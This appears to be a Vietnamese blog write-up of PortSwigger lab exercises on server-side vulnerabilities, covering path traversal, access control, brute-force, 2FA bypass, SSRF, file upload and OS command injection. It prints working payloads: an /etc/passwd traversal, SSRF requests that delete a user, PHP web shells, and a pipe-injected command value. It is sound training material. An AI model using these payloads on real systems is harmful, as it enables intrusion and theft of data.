---
title: Server-side vulnerabilities
published: 2025-08-15
description: Tìm hiểu về các lỗ hổng server-side.
tags: [server-side, security]
category: PortSwigger
draft: true
cover: '/post-imgs/svside/sv-side.jpg'
---

# Path traversal
**Path traversal** (hay **directory traversal**) là lỗ hổng cho phép **kẻ tấn công** truy cập hoặc chỉnh sửa **tệp tùy ý** trên **máy chủ**, bao gồm **mã nguồn**, **thông tin đăng nhập**, **tệp hệ điều hành**… và có thể dẫn đến **chiếm quyền kiểm soát máy chủ**.
## Đọc các tệp tin tùy ý thông qua path traversal
### Ví dụ
**Lab: File path traversal, simple case**

Để tải một hình ảnh lên ứng dụng thường sẽ sử dụng một HTML như sau:

```http
<img src="/loadImage?filename=55.jpg">
```

Các hình ảnh sẽ được lưu ở vị trí `var/www/images/` từ đó để lấy được ảnh ứng dụng sẽ đọc từ đường dẫn `var/www/images/55.jpg`.

Dựa vào điều này kẻ tấn công có thể thực hiện cuộc tấn công như sau:

```http
GET /image?filename=../../../etc/passwd
```

Điều này khiến ứng dụng sẽ đọc theo đường dẫn `var/www/images/../../../etc/passwd`.

../ nghĩa là quay lại một thư mục cha.

Ví dụ: từ thư mục /var/www/images/, nếu dùng ../../../ thì sẽ lần lượt quay về /var/www/ → /var/ → /, tức là thư mục gốc của hệ thống. Vì vậy, tệp được đọc thực chất nằm ở thư mục `etc/passwd`.

# Access control

**Access control** là cơ chế giới hạn **ai** hoặc **cái gì** được phép thực hiện hành động hay truy cập **tài nguyên**. Trong web app, nó dựa vào:

* **Authentication**: xác minh người dùng là **ai**.  
* **Session management**: theo dõi yêu cầu HTTP nào thuộc về **người dùng đó**.  
* **Access control**: quyết định người dùng có **được phép** thực hiện hành động hay không.

**Broken access control** là một lỗ hổng rất thường gặp và gây ra **rủi ro bảo mật nghiêm trọng**.

**Vertical privilege escalation** (leo thang đặc quyền theo chiều dọc) là khi **kẻ tấn công** tăng **quyền hạn** của mình lên mức **cao hơn** so với quyền ban đầu.

## Unprotected functionality (Chức năng không được bảo vệ)
### Ví dụ
**Lab: Unprotected admin functionality**

Lab này có một trang quản trị chứa chức năng nhạy cảm. Ứng dụng không có cơ chế bảo vệ, nên bất kỳ người dùng nào cũng có thể truy cập trực tiếp.

Tiến hành truy cập thử `/robot.txt`:

```http
https://0a4b0042044a262682fa10c0001e0026.web-security-academy.net/robots.txt
```
<p align="center"><b>🠋 kết quả có được 🠋</b></p>

```http
User-agent: *
Disallow: /administrator-panel
```

Và từ đó biết được địa chỉ URL `/administrator-panel` tiến hành truy cập vào và thực hiện các chức năng của admin.

Nếu trong trường hợp /robots.txt không chứa URL thì ta vẫn có thể brute-force để dò ra địa chỉ.

**Lab: Unprotected admin functionality with unpredictable URL**

Trong lab này, các chức năng nhạy cảm được che giấu bằng cách đặt cho chúng một URL khó đoán hơn như:

```http
https://insecure-website.com/administrator-panel-yb556
```

Tuy nhiên, ứng dụng vẫn có thể rò rỉ URL cho người dùng. URL có thể được tiết lộ trong JavaScript xây dựng giao diện người dùng dựa trên vai trò của người dùng:

```html
<script>
  var isAdmin = false;
  if (isAdmin) {
     var topLinksTag = document.getElementsByClassName("top-links")[0];
     var adminPanelTag = document.createElement('a');
     adminPanelTag.setAttribute('href', '/admin-dt608z');
     adminPanelTag.innerText = 'Admin panel';
    topLinksTag.append(adminPanelTag);
     var pTag = document.createElement('p');
     pTag.innerText = '|';
    topLinksTag.appendChild(pTag);
  }
</script>
```

Do đó, ta có thể biết được URL chứa chức năng nhạy cảm là `/admin-dt608z`.

## Parameter-based access control methods (Phương thức kiểm soát truy cập dựa trên tham số)

Một số ứng dụng xác định **quyền** hoặc **vai trò truy cập** của người dùng khi đăng nhập, sau đó lưu trữ thông tin này ở vị trí có thể **kiểm soát người dùng**. Ví dụ như:

  * **Hidden field**  
  * **Cookie**  
  * **Tham số trong query string**

### Ví dụ

**Lab: User role controlled by request parameter**

Trong lab này ta sử dụng `wiener:peter` để đăng nhập và ta sẽ thấy được ứng dụng dùng cookie để xác thực người dùng:

```http
Cookie: Admin=false; session=GmYFedtYymKl4UuKPUmT7wybU1om7m4y
```

Việc cần làm là sửa lại `Admin=true` để người dùng được xác thực thành `admin`.

## Horizontal privilege escalation (Leo thang đặc quyền ngang)

### Ví dụ

**Lab: User ID controlled by request parameter, with unpredictable user IDs**

Trong lab này ta sẽ sử dụng `wiener:peter` để đăng nhập. Và sẽ có được URL để truy cập vào trang tài khoản cá nhân:

```http
https://0a9a00a404eed5eb8154073500b90020.web-security-academy.net/my-account?id=bc09318d-81b9-4314-8334-00a39dda29eb
```

Ta có thể thấy ứng dụng dùng GUIDs để định danh tài khoản.

Thử truy cập một vài bài post ta sẽ thấy được một vài thông tin như sau:

```html
<span id=blog-author><a href='/blogs?userId=bc09318d-81b9-4314-8334-00a39dda29eb'>wiener</a></span>
```

Ở trong post này có một thẻ `<span></span>` chứa thông tin `blog-author`. Ta chỉ việc tìm post chứa thông tin về `carlos`.

```html
<span id=blog-author><a href='/blogs?userId=d3a07227-ad80-46cc-b707-b2bbbe436624'>carlos</a></span>
```

Với post của `blog-author` là `carlos` thì ta sẽ có được URL để truy cập trang cá nhân của `carlos` là:

```http
/my-account?id=d3a07227-ad80-46cc-b707-b2bbbe436624
```

## Horizontal to vertical privilege escalation (Sự leo thang theo chiều ngang đến theo chiều dọc)

### Ví dụ

**Lab: User ID controlled by request parameter with password disclosure**

Trong lab này nếu ta đăng nhặp với thông tin `wiener:peter` thì URL truy cập tài khoản cá nhân sẽ là:

```http
https://0a3e005603da1c33813c3a18002b00d6.web-security-academy.net/my-account?id=wiener
```
và trong trang sẽ có thông tin mật khẩu của tài khoản cá nhân:

```html
<input required type=password name=password value='peter'/>
```

Sau khi thử đổi `my-account?id=administrator` và ta đã truy cập được vào trang `administrator` và có được mật khẩu của `administrator`:

```html
<input required type=password name=password value='eyx7jirp9vmukopt8675'/>
```

Tiến hành đăng nhập với thông tin `administrator:eyx7jirp9vmukopt8675` và thực hiện các chức năng với `admin`.

# Authentication

**So sánh sự khác biệt giữa `Authentication (Xác thực)` và `Authorization (Phân quyền)`**

`Authentication (Xác thực)`

Là quá trình **xác minh danh tính** của người dùng để đảm bảo họ đúng là **người mà họ khai báo**.  
Hệ thống sử dụng các phương thức như **mật khẩu**, **mã OTP**, **vân tay**, **khuôn mặt** hoặc **chứng chỉ số** để kiểm tra.

`Authorization (Phân quyền)`

Là quá trình **xác định quyền hạn** của người dùng sau khi đã được **xác thực thành công**.  
Hệ thống quyết định người dùng có được phép **truy cập tài nguyên**, **dữ liệu** hoặc **thực hiện hành động** cụ thể nào đó trong hệ thống hay không.

## Tấn công Brute-force (Brute-force attacks)

* **Tấn công brute-force** là phương pháp dùng thử sai để đoán **thông tin đăng nhập** của người dùng. Quá trình này thường được tự động hóa bằng **wordlist** và **công cụ chuyên dụng**, giúp kẻ tấn công thực hiện hàng loạt yêu cầu đăng nhập với tốc độ cao.

* Hiệu quả tấn công có thể tăng lên nếu kẻ tấn công sử dụng **logic** hoặc **thông tin công khai** để đưa ra các phán đoán chính xác hơn.

* Những website chỉ dựa vào **mật khẩu** để xác thực sẽ dễ bị tấn công nếu không có cơ chế bảo vệ **chống brute-force**.

### Brute-force username (Tấn công brute-force tên đăng nhập)

Tên đăng nhập thường dễ bị đoán nếu tuân theo một **mẫu đặt tên phổ biến**, chẳng hạn như:

* Địa chỉ email theo định dạng: `firstname.lastname@company.com`.  
* Các tên mặc định quen thuộc: **admin**, **administrator**.

Khi kiểm thử bảo mật, cần đánh giá xem website có vô tình để lộ **tên đăng nhập** hay không bằng cách:

* Kiểm tra khả năng truy cập **hồ sơ người dùng** mà không cần đăng nhập.  
* Quan sát **tên hiển thị** trong hồ sơ, vì đôi khi chúng trùng với tên đăng nhập.  
* Phân tích **HTTP responses** để tìm các địa chỉ email — đặc biệt là của **quản trị viên** hoặc **bộ phận IT** — vì đây có thể là các tài khoản có quyền cao.

### Brute-forcing passwords (Tấn công brute-force mật khẩu)

Mật khẩu có thể bị brute-force, nhưng độ khó phụ thuộc vào **độ mạnh của mật khẩu**. Nhiều website áp dụng **chính sách mật khẩu** để tăng độ bảo mật, thường yêu cầu:

* **Độ dài tối thiểu**.  
* **Kết hợp chữ hoa và chữ thường**.  
* Có ít nhất một **ký tự đặc biệt**.

Mật khẩu phức tạp (**high-entropy**) thường khó bị brute-force, nhưng **thói quen người dùng** lại tạo ra lỗ hổng:

* Người dùng thường biến đổi mật khẩu dễ nhớ để đáp ứng chính sách,  
  Ví dụ: `mypassword` → `Mypassword1!` hoặc `Myp4$$w0rd`.  
* Khi đổi mật khẩu định kỳ, họ chỉ thay đổi nhỏ và dễ đoán:  
  Ví dụ: `Mypassword1!` → `Mypassword2!`.

Hiểu các **mẫu mật khẩu phổ biến** giúp kẻ tấn công tinh chỉnh brute-force và tăng hiệu quả tấn công.

### Username enumeration (Liệt kê tên người dùng)

**Username enumeration** là một kỹ thuật tấn công trong đó kẻ tấn công khai thác **sự khác biệt trong phản hồi** của website để xác định **username** nào hợp lệ.

### Ví dụ
**Lab: Username enumeration via different responses**

Trong lab này khi đăng nhập với thông tin `abc:abc` thì sẽ có được phản hổi:

```html
<p class=is-warning>Incorrect password</p>
```

Tiến hành giữ nguyên mật khẩu và brute-force `username:autodiscover` thì sẽ có thêm được một phản hồi mới:

```html
<p class=is-warning>Incorrect password</p>
```
Suy ra `username:autodiscover` đã chính xác, chỉ còn mật khẩu là chưa đúng. Tiến hành giữ nguyên `username:autodiscover` và brute-force mật khẩu thì ta có được `password:joshua`.

### Bypassing two-factor authentication (Bỏ qua xác thực hai yếu tố)

### Ví dụ
**Lab: 2FA simple bypass**

Trong lab này tiến hành đăng nhập với thông tin `wiener:peter` sau đó nhập mã xác nhận và bạn sẽ được chuyển đến trang cá nhân với URL:

```http 
https://0a5000770462c11b800f857d00a9002c.web-security-academy.net/my-account?id=wiener
```

Thêm một tab khác tiến hành đăng nhập với thông tin `carlos:montoya` khi đến bước xác thực mã thì quay lại tab đầu và sửa URL như sau:

```http 
https://0a5000770462c11b800f857d00a9002c.web-security-academy.net/my-account?id=wiener
                                                                                  🠋
https://0a5000770462c11b800f857d00a9002c.web-security-academy.net/my-account?id=carlos

```

Và ta có thể đăng nhập vào trang cá nhân của `carlos`.

Nguyên nhân là trong trường hợp này **2FA (two-factor authentication)** được triển khai **sai**.  
Sau khi người dùng nhập **mật khẩu**, trang sẽ yêu cầu **mã xác thực** ở bước tiếp theo, nhưng thực tế **trạng thái đăng nhập đã được thiết lập** từ bước nhập mật khẩu.  
Khi đó, có thể **truy cập trực tiếp** vào các trang **chỉ dành cho người đã đăng nhập** mà **không cần nhập mã 2FA**.

# Server-side request forgery (SSRF)
  
**Server-side request forgery (SSRF)** là một **lỗ hổng bảo mật web** cho phép kẻ tấn công khiến **ứng dụng phía máy chủ** thực hiện các **yêu cầu (request)** đến một vị trí ngoài ý muốn.

Trong một **cuộc tấn công SSRF**, kẻ tấn công có thể lợi dụng máy chủ để:

* **Truy cập dịch vụ nội bộ** trong hệ thống của tổ chức.  
* **Kết nối đến hệ thống bên ngoài** theo ý muốn.  

Hậu quả có thể dẫn đến **rò rỉ dữ liệu nhạy cảm**, ví dụ như **thông tin xác thực**.

## SSRF attacks against the server (Tấn công SSRF nhắm vào máy chủ)

Trong tấn công **SSRF** nhắm vào chính **máy chủ**, kẻ tấn công lợi dụng ứng dụng để gửi yêu cầu **HTTP** về chính máy chủ thông qua **loopback** bằng cách sử dụng URL chứa **127.0.0.1** hoặc **localhost** nhằm truy cập các **tài nguyên** hoặc **chức năng nội bộ** trái phép.

Ứng dụng mặc định tin tưởng yêu cầu từ **máy cục bộ** vì:

* **Kiểm soát truy cập** đặt ở thành phần khác → bỏ qua kiểm tra khi **kết nối nội bộ**.  
* **Khôi phục hệ thống**: cho phép quyền **quản trị** không cần đăng nhập với yêu cầu từ **máy cục bộ**.  
* **Giao diện quản trị** dùng **cổng riêng**, chỉ truy cập được từ **nội bộ**.

### Ví dụ

**Lab: Basic SSRF against the local server**

Phòng lab này có một tính năng kiểm tra tồn kho (stock check) dùng để lấy dữ liệu từ hệ thống nội bộ.

Khi người dùng sử stock check thì sẽ có request như sau:

```http
POST /product/stock HTTP/2
Content-Length: 107
Content-Type: application/x-www-form-urlencoded
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Tiến hành sửa  request để chỉ định một URL cục bộ trên máy chủ:

```http
POST /product/stock HTTP/2
Content-Length: 107
Content-Type: application/x-www-form-urlencoded
stockApi=http%3a%2f%2flocalhost%2fadmin
```

Khi đó, máy chủ sẽ truy cập vào URL /admin và trả lại toàn bộ nội dung của trang admin.

Nhưng nếu bạn thao với các chức năng trên trang /admin thì sẽ không được vì sẽ bị kiểm tra quyền truy cập vì vậy ta sẽ phải thay đổi để request này được yêu cầu từ loopback:

```http
POST /product/stock HTTP/2
Content-Length: 107
Content-Type: application/x-www-form-urlencoded
stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete?username=carlos
```

## SSRF attacks against other back-end systems (Tấn công SSRF nhắm vào hệ thống back-end)

* Máy chủ ứng dụng đôi khi có thể tương tác với các **hệ thống back-end** nằm trong **mạng nội bộ** mà người dùng bên ngoài không thể truy cập.

* Các hệ thống này thường dùng **địa chỉ IP riêng** và được bảo vệ bởi cấu trúc mạng, nên **bảo mật** thường yếu hơn.

* Nếu kẻ tấn công khai thác **lỗ hổng SSRF**, họ có thể gửi **yêu cầu gián tiếp** thông qua máy chủ ứng dụng để **truy cập các chức năng nhạy cảm** trên hệ thống back-end, thậm chí **không cần xác thực**.

### Ví dụ

**Lab: Basic SSRF against another back-end system**

Trong phòng lab này cũng có chức năng stock check và có request như sau:

```http
POST /product/stock HTTP/2
Content-Length: 96
Content-Type: application/x-www-form-urlencoded
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D4%26storeId%3D1
```

Trong lab này request này sẽ tương tác với một hệ thống back-end với địa chỉ là 192.168.0.1:8080 để yêu cầu stock check. 

Tiến hành thay đổi URL để chỉ định đến trang admin với định dạng `http://192.168.0.x:8080/admin` với x sẽ là một ip từ `1-255`. Tiến hành dò x thì ta sẽ có `x=18` và ta có được request như sau:

```http
POST /product/stock HTTP/2
Content-Length: 96
Content-Type: application/x-www-form-urlencoded
stockApi=http%3A%2F%2F192.168.0.18%3A8080%2Fadmin
```

Thay đổi request để có thể xóa `user=carlos` từ loopback

```http
POST /product/stock HTTP/2
Content-Length: 96
Content-Type: application/x-www-form-urlencoded
stockApi=http%3A%2F%2F192.168.0.18%3A8080%2Fadmin%2Fdelete?username=carlos
```

# File upload vulnerabilities (Lỗ hổng tải tệp)

Lỗ hổng xảy ra khi **máy chủ web** cho phép người dùng **tải tệp** nhưng không **kiểm tra kỹ** tên, loại, nội dung hoặc kích thước tệp.

Kẻ tấn công có thể lợi dụng để tải lên **tệp độc hại**, ví dụ như tệp **script** nhằm thực thi mã từ xa (**RCE**).

* Có trường hợp **chỉ cần tải tệp lên** là gây hại.  
* Trường hợp khác cần gửi thêm **request HTTP** để **kích hoạt tệp** và **khai thác hệ thống**.

Lỗ hổng tải tệp xuất hiện khi cơ chế kiểm tra tệp **không chặt chẽ** hoặc **dễ bị bypass**:

1. **Kiểm tra sai hoặc yếu** → cho phép tải tệp độc hại.  
2. **Dùng blacklist** nhưng bỏ sót đuôi file nguy hiểm hoặc bị vượt qua nhờ **lỗi phân tích**.  
3. Kiểm tra **loại tệp** dựa vào thuộc tính dễ **giả mạo** (MIME type, metadata).  
4. **Kiểm tra không đồng nhất** giữa các máy chủ hoặc thư mục → dễ bị khai thác.

## Exploiting unrestricted file uploads to deploy a web shell 

Khi website cho phép tải lên **file script** (ví dụ **PHP**, **Java**, **Python**) và **thực thi trực tiếp**, kẻ tấn công có thể tải **web shell** để **chiếm quyền máy chủ**.

* **Web shell**: Script độc hại cho phép **thực thi lệnh tùy ý** trên máy chủ từ xa thông qua **HTTP request**.

* Hậu quả khi upload thành công **web shell**:
  1. **Đọc** và **ghi** bất kỳ **tệp nào** trên hệ thống.  
  2. **Trích xuất dữ liệu nhạy cảm** từ máy chủ.  
  3. Sử dụng **máy chủ bị chiếm** để **tấn công hệ thống nội bộ** hoặc các **máy chủ khác**.

### Ví dụ
**Lab: Remote code execution via web shell upload**

Trong lab này sẽ có chức năng upload avatar.

Đầu tiên tiến hành đăng nhập vào tài khoản `wiener:peter` và tiến hành upload avatar với ảnh `avt.png`.

```http
POST /my-account/avatar HTTP/2
Content-Disposition: form-data; name="avatar"; filename="avt.png"
Content-Type: image/png
//Nội dung của ảnh
```

Sau đó tiến hành thay đổi để tải lên một đoạn PHP web shell

```http
POST /my-account/avatar HTTP/2
Content-Disposition: form-data; name="avatar"; filename="avt.php"
Content-Type: image/png
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Tiến hành gửi request 

```http
GET /files/avatars/abc.php HTTP/2
```

Và ta sẽ có được nội dung của `/home/carlos/secret`

## Flawed file type validation (Xác thực loại tệp bị lỗi)

Khi gửi các **biểu mẫu (forms) HTML**, trình duyệt thường gửi dữ liệu trong một yêu cầu **POST** với **Content-Type** là **application/x-www-form-urlencoded**.

Cách này phù hợp để gửi **dữ liệu văn bản** đơn giản như **tên**, **địa chỉ**, **email**,…

Tuy nhiên, kiểu này **không phù hợp** để gửi **dữ liệu nhị phân lớn (binary data)**, ví dụ như một **tệp ảnh** hoặc **tệp PDF**.

Trong trường hợp này, Content-Type thích hợp hơn là multipart/form-data.

### Ví dụ
**Lab: Web shell upload via Content-Type restriction bypas**

Ta sẽ có một file `shell.php` với nội dung:

```
<?php echo system($_GET['cmd']); ?>
```

Tiến hành thử upload avatar với file `.php` thì sẽ bị lỗi.

```http
POST /my-account/avatar HTTP/2
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php
<?php echo system($_GET['cmd']); ?>
```
Tiến hành thay đổi `Content-Type: application/x-php` => `Content-Type: image/png` và việc upload file `.php` sẽ được chấp nhận.

Ta sẽ có một request để gọi `shell.php`

```http
GET /files/avatars/shell.php
```
Thay đổi request để đạt được mục đích
```http
GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret HTTP/2\
```

# OS command injection (hay còn gọi là shell injection)

**OS Command Injection** là một **lỗ hổng bảo mật** cho phép **kẻ tấn công** **thực thi các lệnh của hệ điều hành (OS commands)** trực tiếp trên **máy chủ** đang chạy ứng dụng.

Khi **khai thác thành công**, hacker có thể **toàn quyền kiểm soát ứng dụng**, **truy cập hoặc đánh cắp dữ liệu**, thậm chí **chiếm quyền điều khiển toàn bộ máy chủ**.

Sau khi phát hiện lỗ hổng **OS Command Injection**, bạn có thể dùng một số **lệnh cơ bản** để **thu thập thông tin về hệ thống**.

```
        Mục đích                Linux         Windows
Tên người dùng hiện tại         whoami        whoami
Thông tin hệ điều hành          uname -a      ver
Cấu hình mạng                   ifconfig      ipconfig /all
Kết nối mạng đang hoạt động     netstat -an   netstat -an
Các tiến trình đang chạy        ps -ef        tasklist
```

### Ví dụ
**Lab: OS command injection, simple case**

Thực hiện request stock check:

```http
POST /product/stock HTTP/2
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Referer: https://0a1a008603181728804471e8008c000d.web-security-academy.net/product?productId=7
productId=7&storeId=1
```

Và kết quả của của request này sẽ là `98`.

Thử thay đổi request như sau:

```http
POST /product/stock HTTP/2
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
https://0a1a008603181728804471e8008c000d.web-security-academy.net/product?productId=7
productId=7|echo abcd&storeId=1
```
Ký tự `|` được gọi là pipe operator (toán tử ống).

Nó dùng để chuyển kết quả (output) của lệnh bên trái thành input cho lệnh bên phải.

Và kết quả của của request này sẽ là `abcd 98`suy ra tinh năng này có thể khai thác shell injection.

Sau đó thay đổi `echo abcd` => `whoami` để hoàn thành lab.
